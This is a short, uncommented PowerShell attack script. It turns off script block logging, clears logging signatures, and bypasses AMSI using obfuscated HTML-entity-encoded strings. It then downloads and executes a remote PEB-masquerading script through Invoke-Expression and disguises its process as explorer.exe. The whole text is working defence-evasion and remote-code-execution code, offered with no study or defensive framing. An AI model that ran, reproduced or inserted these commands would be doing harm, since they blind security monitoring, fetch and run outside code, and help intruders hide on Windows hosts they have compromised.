$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
[ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
[Ref].Assembly.GetType($([sYSTEM.Net.WebuTILITy]::HTmldECODE('&#83;&#121;&#115;&#116;&#101;&#109;&#46;&#77;&#97;&#110;&#97;&#103;&#101;&#109;&#101;&#110;&#116;&#46;&#65;&#117;&#116;&#111;&#109;&#97;&#116;&#105;&#111;&#110;&#46;&#65;&#109;&#115;&#105;&#85;&#116;&#105;&#108;&#115;'))).GetField(''+$([sYstEm.net.webutilIty]::hTMldECOde('&#97;&#109;&#115;&#105;'))+'InitFailed','NonPublic,Static').SetValue($null,$true);
Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Masquerade-PEB.ps1');
Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
Masquerade-PEB -BinPath "C:\Windows\explorer.exe"